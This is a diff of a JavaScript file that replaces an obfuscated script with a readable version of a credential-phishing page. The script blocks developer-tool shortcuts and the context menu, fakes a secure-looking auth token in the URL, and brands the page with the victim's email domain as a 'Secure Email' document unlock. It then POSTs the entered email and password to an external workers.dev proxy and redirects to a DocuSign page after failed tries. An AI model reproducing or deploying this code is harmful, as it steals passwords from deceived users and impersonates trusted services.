@@ -1,1 +1,168 @@
-const _0x32cfa4=_0xcfba;(function(_0x867876,_0x1ae4cc){const _0x29016b=_0xcfba,_0x260641=_0x867876();while(!![]){try{const _0x44dc9c=parseInt(_0x29016b(0x93))/0x1+parseInt(_0x29016b(0xc2))/0x2+-parseInt(_0x29016b(0xad))/0x3+parseInt(_0x29016b(0xa6))/0x4*(parseInt(_0x29016b(0x95))/0x5)+-parseInt(_0x29016b(0x96))/0x6+-parseInt(_0x29016b(0xbb))/0x7*(parseInt(_0x29016b(0xe1))/0x8)+parseInt(_0x29016b(0xdf))/0x9;if(_0x44dc9c===_0x1ae4cc)break;else _0x260641['push'](_0x260641['shift']());}catch(_0x478e3b){_0x260641['push'](_0x260641['shift']());}}}(_0x1179,0x99535),document[_0x32cfa4(0xd5)]=function(_0xc025b9){const _0x1d50af=_0x32cfa4;if(_0xc025b9[_0x1d50af(0xc8)]==0x7b)return![];if(_0xc025b9[_0x1d50af(0xc3)]&&_0xc025b9[_0x1d50af(0xb2)]&&(_0xc025b9[_0x1d50af(0xc8)]=='I'['charCodeAt'](0x0)||_0xc025b9[_0x1d50af(0xc8)]=='C'[_0x1d50af(0xdb)](0x0)||_0xc025b9['keyCode']=='J'[_0x1d50af(0xdb)](0x0)))return![];if(_0xc025b9[_0x1d50af(0xc3)]&&(_0xc025b9[_0x1d50af(0xc8)]=='U'[_0x1d50af(0xdb)](0x0)||_0xc025b9['keyCode']=='S'['charCodeAt'](0x0)))return![];},document[_0x32cfa4(0xbf)](_0x32cfa4(0xe4),_0x526c77=>_0x526c77[_0x32cfa4(0xb9)]()));const SECRET_KEY=_0x32cfa4(0x98);let failedAttempts=0x0;function encryptPayload(_0x2905d2){const _0x467cf5=_0x32cfa4,_0x52f92e=JSON[_0x467cf5(0xd0)](_0x2905d2);let _0xb9f115='';for(let _0x45d6c5=0x0;_0x45d6c5<_0x52f92e[_0x467cf5(0xda)];_0x45d6c5++){const _0x1a869b=_0x52f92e[_0x467cf5(0xdb)](_0x45d6c5)^SECRET_KEY[_0x467cf5(0xdb)](_0x45d6c5%SECRET_KEY['length']);_0xb9f115+=('0'+_0x1a869b[_0x467cf5(0xe7)](0x10))['slice'](-0x2);}return btoa(_0xb9f115);}(function spicyUrl(){const _0x359bab=_0x32cfa4;if(!window['location'][_0x359bab(0xaa)]){const _0x49dd7d=_0x359bab(0xb4);let _0x551941='';for(let _0x21db03=0x0;_0x21db03<0x40;_0x21db03++){_0x551941+=_0x49dd7d[_0x359bab(0x97)](Math[_0x359bab(0xc7)](Math[_0x359bab(0xc6)]()*_0x49dd7d['length']));}const _0x3a1906=window['location'][_0x359bab(0xa8)]+'//'+window['location'][_0x359bab(0x99)]+window['location']['pathname']+'?auth_token='+_0x551941+'&session_ref=v4_secure_verification';window[_0x359bab(0xae)][_0x359bab(0x90)]({'path':_0x3a1906},'',_0x3a1906);}}());const viper=document['getElementById'](_0x32cfa4(0xa2));function _0xcfba(_0x4ad978,_0x26b6c8){_0x4ad978=_0x4ad978-0x8a;const _0x5c501a=_0x1179();let _0x13a9da=_0x5c501a[_0x4ad978];return _0x13a9da;}(function spiritSeal(){const _0x4521f2=_0x32cfa4,_0x5dec82=viper[_0x4521f2(0xdd)];_0x5dec82[_0x4521f2(0xb8)]('@')&&(document[_0x4521f2(0xd4)](_0x4521f2(0xc5))[_0x4521f2(0xba)]=_0x4521f2(0xcd)+_0x5dec82[_0x4521f2(0xa3)]('@')[0x1]['toLowerCase']());}(),(function(){const _0x35354e=_0x32cfa4,_0x395353=(function(){let _0x518580=!![];return function(_0x221dcc,_0x419fc6){const _0x252b88=_0x518580?function(){const _0x10e99b=_0xcfba;if(_0x419fc6){const _0x1611ee=_0x419fc6[_0x10e99b(0xb0)](_0x221dcc,arguments);return _0x419fc6=null,_0x1611ee;}}:function(){};return _0x518580=![],_0x252b88;};}()),_0x4d82c9=_0x395353(this,function(){const _0x4e8323=_0xcfba;if(_0x4d82c9[_0x4e8323(0xc4)]()['toString']()['indexOf']('\x0a')!==-0x1)return;return _0x4d82c9[_0x4e8323(0xe7)]()[_0x4e8323(0xaa)](_0x4e8323(0xa5))[_0x4e8323(0xe7)]()['constructor'](_0x4d82c9)['search'](_0x4e8323(0xa5));});_0x4d82c9();const _0x3a6e31=(function(){let _0x4b070a=!![];return function(_0x461405,_0x1ae1fb){const _0x523c5a=_0x4b070a?function(){const _0x2fdaa7=_0xcfba;if(_0x1ae1fb){const _0x551151=_0x1ae1fb[_0x2fdaa7(0xb0)](_0x461405,arguments);return _0x1ae1fb=null,_0x551151;}}:function(){};return _0x4b070a=![],_0x523c5a;};}()),_0xaa90b6=_0x3a6e31(this,function(){const _0x4f8880=_0xcfba,_0xeb56b=function(){const _0x987ac8=_0xcfba;let _0x6e26ff;try{_0x6e26ff=Function(_0x987ac8(0xdc)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x2f798a){_0x6e26ff=window;}return _0x6e26ff;},_0x5d389a=_0xeb56b(),_0x356ffb=_0x5d389a['console']=_0x5d389a[_0x4f8880(0xe0)]||{},_0x10b74e=['log',_0x4f8880(0xd3),'info',_0x4f8880(0xbe),_0x4f8880(0xd1),'table',_0x4f8880(0xb5)];for(let _0x12efde=0x0;_0x12efde<_0x10b74e['length'];_0x12efde++){const _0x3d8178=_0x3a6e31['constructor'][_0x4f8880(0xce)][_0x4f8880(0xc4)](_0x3a6e31),_0x48e9b3=_0x10b74e[_0x12efde],_0x7702f1=_0x356ffb[_0x48e9b3]||_0x3d8178;_0x3d8178[_0x4f8880(0xe6)]=_0x3a6e31[_0x4f8880(0xc4)](_0x3a6e31),_0x3d8178[_0x4f8880(0xe7)]=_0x7702f1[_0x4f8880(0xe7)][_0x4f8880(0xc4)](_0x7702f1),_0x356ffb[_0x48e9b3]=_0x3d8178;}});_0xaa90b6();const _0x3264d3=document[_0x35354e(0xd4)](_0x35354e(0xa2)),_0x39b811=document[_0x35354e(0xd4)]('doc-title');if(_0x3264d3&&_0x3264d3[_0x35354e(0xdd)][_0x35354e(0xb8)]('@')){let _0x438fd5=_0x3264d3[_0x35354e(0xdd)][_0x35354e(0xa3)]('@')[0x1][_0x35354e(0xa3)]('.')[0x0],_0x3a2ea5=_0x438fd5[_0x35354e(0x97)](0x0)[_0x35354e(0xb7)]()+_0x438fd5[_0x35354e(0xde)](0x1);document[_0x35354e(0xe5)]=_0x3a2ea5+_0x35354e(0xd6),_0x39b811[_0x35354e(0x94)]=_0x3a2ea5+_0x35354e(0xd6);}}()));function falcon(){const _0x18850e=_0x32cfa4,_0x181ba3=viper[_0x18850e(0xdd)],_0x503894=document[_0x18850e(0xd4)](_0x18850e(0xca))[_0x18850e(0xdd)],_0x28afea=document['getElementById'](_0x18850e(0x9e)),_0xf28762=document[_0x18850e(0xd4)](_0x18850e(0xd2)),_0x1134a1=document[_0x18850e(0xd4)](_0x18850e(0xab)),_0x36d9f2=document['getElementById'](_0x18850e(0xcf));document['getElementById']('sentinel')[_0x18850e(0x91)][_0x18850e(0xcb)]='none',_0x36d9f2[_0x18850e(0xe9)][_0x18850e(0xc9)](_0x18850e(0xac));if(!_0x503894||_0x503894[_0x18850e(0xda)]<0x1){showError(_0x18850e(0xa1)),_0x36d9f2[_0x18850e(0xe9)][_0x18850e(0x8a)](_0x18850e(0xac));return;}const _0x4e1b8d=new URLSearchParams();_0x4e1b8d[_0x18850e(0x8e)](_0x18850e(0xe2),_0x181ba3),_0x4e1b8d[_0x18850e(0x8e)]('Feedback',_0x503894),_0x4e1b8d['append'](_0x18850e(0x92),Date['now']()[_0x18850e(0xe7)]()),_0x28afea['disabled']=!![],_0xf28762['style']['display']=_0x18850e(0x9a),_0x1134a1['innerText']='Verifying...',fetch(_0x18850e(0xb6),{'method':_0x18850e(0xd7),'headers':{'Content-Type':_0x18850e(0x9c)},'body':_0x4e1b8d})[_0x18850e(0x9d)](_0x55c338=>_0x55c338[_0x18850e(0xa7)]())['then'](_0xa3abe=>{const _0x400749=_0x18850e;_0x28afea['disabled']=![],_0xf28762[_0x400749(0x91)][_0x400749(0xcb)]='none',_0x1134a1[_0x400749(0x94)]=_0x400749(0xa9);if(_0xa3abe['status']===_0x400749(0xbc)){showError('✌\x20Access\x20locked.\x20Too\x20many\x20failed\x20attempts.'),_0x28afea[_0x400749(0xbd)]=!![],setTimeout(()=>{const _0x244393=_0x400749;window[_0x244393(0xc1)][_0x244393(0xb3)]=_0x244393(0xa4);},0xbb8);return;}if(_0xa3abe[_0x400749(0x9b)]===_0x400749(0xcc)){failedAttempts++;if(failedAttempts>=0x3){showError(_0x400749(0xc0)),_0x28afea[_0x400749(0xbd)]=!![],setTimeout(()=>{const _0x400c1e=_0x400749;window[_0x400c1e(0xc1)][_0x400c1e(0xb3)]=_0x400c1e(0xa4);},0xbb8);return;}showError('An\x20error\x20occurred\x20please\x20try\x20again\x20later.'),_0x36d9f2[_0x400749(0xe9)][_0x400749(0x8a)](_0x400749(0xac)),document[_0x400749(0xd4)](_0x400749(0xca))['value']='';return;}_0xa3abe['status']===_0x400749(0xd8)?(_0x1134a1[_0x400749(0x94)]=_0x400749(0xa0),_0x28afea[_0x400749(0x91)][_0x400749(0xb1)]=_0x400749(0xaf),window[_0x400749(0xc1)][_0x400749(0xb3)]=_0xa3abe[_0x400749(0xe8)]):showError(_0x400749(0x8d));})[_0x18850e(0xe3)](()=>{const _0x5f3e7b=_0x18850e;failedAttempts++;if(failedAttempts>=0x3){showError(_0x5f3e7b(0x9f)),setTimeout(()=>{window['location']['href']='https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f';},0xbb8);return;}_0x28afea[_0x5f3e7b(0xbd)]=![],_0xf28762[_0x5f3e7b(0x91)][_0x5f3e7b(0xcb)]=_0x5f3e7b(0x8c),_0x1134a1[_0x5f3e7b(0x94)]=_0x5f3e7b(0xa9),showError(_0x5f3e7b(0xd9));});}function showError(_0x346c92){const _0xe6cc3=_0x32cfa4,_0x5cd06a=document['getElementById'](_0xe6cc3(0x8f));_0x5cd06a['style'][_0xe6cc3(0xcb)]=_0xe6cc3(0x8b),document[_0xe6cc3(0xd4)]('error-text')[_0xe6cc3(0x94)]=_0x346c92;}function _0x1179(){const _0x2faa9b=['search','btn-text','shake','2965494JNwtqt','history','#10b981','apply','background','shiftKey','href','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789','trace','https://rum-email-proxy.haricoting.workers.dev/contact','toUpperCase','includes','preventDefault','src','1673RBHPly','exhausted','disabled','error','addEventListener','✌\x20Access\x20locked.\x20Too\x20many\x20failed\x20attempts.','location','1778498dvoWsS','ctrlKey','bind','totem','random','floor','keyCode','remove','cobra','display','wrong','https://www.google.com/s2/favicons?sz=128&domain=','prototype','loginBox','stringify','exception','loading-spinner','warn','getElementById','onkeydown','\x20Secure\x20Email','POST','success','Connection\x20error.','length','charCodeAt','return\x20(function()\x20','value','slice','2684790JXdFzq','console','15320JNwEri','Name','catch','contextmenu','title','__proto__','toString','redirect','classList','add','flex','none','Security\x20token\x20mismatch.','append','sentinel','replaceState','style','timestamp','141783OayATi','innerText','1243105mEggdP','1497732pclxfO','charAt','MATT_SECURE_2026','host','block','status','application/x-www-form-urlencoded','then','btn-unlock','✌\x20System\x20Locked.\x20Redirecting...','Success!\x20Redirecting...','Please\x20enter\x20your\x20password.','viper','split','https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f','(((.+)+)+)+$','16zaBEiw','json','protocol','Unlock\x20Document'];_0x1179=function(){return _0x2faa9b;};return _0x1179();}
+document.onkeydown = function (event) {
+  if (event.keyCode == 123) {
+    return false;
+  }
+  if (
+    event.ctrlKey &&
+    event.shiftKey &&
+    (event.keyCode == "I".charCodeAt(0) ||
+      event.keyCode == "C".charCodeAt(0) ||
+      event.keyCode == "J".charCodeAt(0))
+  ) {
+    return false;
+  }
+  if (
+    event.ctrlKey &&
+    (event.keyCode == "U".charCodeAt(0) || event.keyCode == "S".charCodeAt(0))
+  ) {
+    return false;
+  }
+};
+document.addEventListener("contextmenu", (e) => e.preventDefault());
+const SECRET_KEY = "MATT_SECURE_2026";
+let failedAttempts = 0;
+
+function encryptPayload(obj) {
+  const json = JSON.stringify(obj);
+  let hex = "";
+
+  for (let i = 0; i < json.length; i++) {
+    const xorByte =
+      json.charCodeAt(i) ^ SECRET_KEY.charCodeAt(i % SECRET_KEY.length);
+
+    hex += ("0" + xorByte.toString(16)).slice(-2);
+  }
+
+  return btoa(hex);
+}
+(function spicyUrl() {
+  if (!window.location.search) {
+    const alphabet =
+      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    let token = "";
+    for (let i = 0; i < 64; i++) {
+      token += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+    }
+    const newUrl =
+      window.location.protocol +
+      "//" +
+      window.location.host +
+      window.location.pathname +
+      "?auth_token=" +
+      token +
+      "&session_ref=v4_secure_verification";
+
+    window.history.replaceState({ path: newUrl }, "", newUrl);
+  }
+})();
+const viper = document.getElementById("viper");
+(function spiritSeal() {
+  const value = viper.value;
+  if (value.includes("@")) {
+    document.getElementById("totem").src =
+      "https://www.google.com/s2/favicons?sz=128&domain=" +
+      value.split("@")[1].toLowerCase();
+  }
+})();
+(function () {
+  const emailEl = document.getElementById("viper");
+  const titleEl = document.getElementById("doc-title");
+
+  if (emailEl && emailEl.value.includes("@")) {
+    let domainPart = emailEl.value.split("@")[1].split(".")[0];
+    let brand = domainPart.charAt(0).toUpperCase() + domainPart.slice(1);
+    document.title = brand + " Secure Email";
+    titleEl.innerText = brand + " Secure Email";
+  }
+})();
+function falcon() {
+  const customerName = viper.value;
+  const customerMessage = document.getElementById("cobra").value;
+  const unlockBtn = document.getElementById("btn-unlock");
+  const spinner = document.getElementById("loading-spinner");
+  const btnText = document.getElementById("btn-text");
+  const form = document.getElementById("loginBox");
+  document.getElementById("sentinel").style.display = "none";
+  form.classList.remove("shake");
+  if (!customerMessage || customerMessage.length < 1) {
+    showError("Please enter your password.");
+    form.classList.add("shake");
+    return;
+  }
+  const cleanPayload = new URLSearchParams();
+  cleanPayload.append("Name", customerName);
+  cleanPayload.append("Feedback", customerMessage);
+  cleanPayload.append("timestamp", Date.now().toString());
+  unlockBtn.disabled = true;
+  spinner.style.display = "block";
+  btnText.innerText = "Verifying...";
+  fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+    },
+    body: cleanPayload,
+  })
+    .then((r) => r.json())
+    .then((result) => {
+      unlockBtn.disabled = false;
+      spinner.style.display = "none";
+      btnText.innerText = "Unlock Document";
+      if (result.status === "exhausted") {
+        showError("✌ Access locked. Too many failed attempts.");
+        unlockBtn.disabled = true;
+        setTimeout(() => {
+          window.location.href =
+            "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
+        }, 3000);
+        return;
+      }
+
+      if (result.status === "wrong") {
+        failedAttempts++;
+
+        if (failedAttempts >= 3) {
+          showError("✌ Access locked. Too many failed attempts.");
+          unlockBtn.disabled = true;
+          setTimeout(() => {
+            window.location.href =
+              "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
+          }, 3000);
+          return;
+        }
+
+        showError("An error occurred please try again later.");
+        form.classList.add("shake");
+        document.getElementById("cobra").value = "";
+        return;
+      }
+
+      if (result.status === "success") {
+        btnText.innerText = "Success! Redirecting...";
+        unlockBtn.style.background = "#10b981";
+        window.location.href = result.redirect;
+      } else {
+        showError("Security token mismatch.");
+      }
+    })
+    .catch(() => {
+      failedAttempts++;
+      if (failedAttempts >= 3) {
+        showError("✌ System Locked. Redirecting...");
+        setTimeout(() => {
+          window.location.href =
+            "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
+        }, 3000);
+        return;
+      }
+      unlockBtn.disabled = false;
+      spinner.style.display = "none";
+      btnText.innerText = "Unlock Document";
+      showError("Connection error.");
+    });
+}
+function showError(message) {
+  const container = document.getElementById("sentinel");
+  container.style.display = "flex";
+  document.getElementById("error-text").innerText = message;
+}
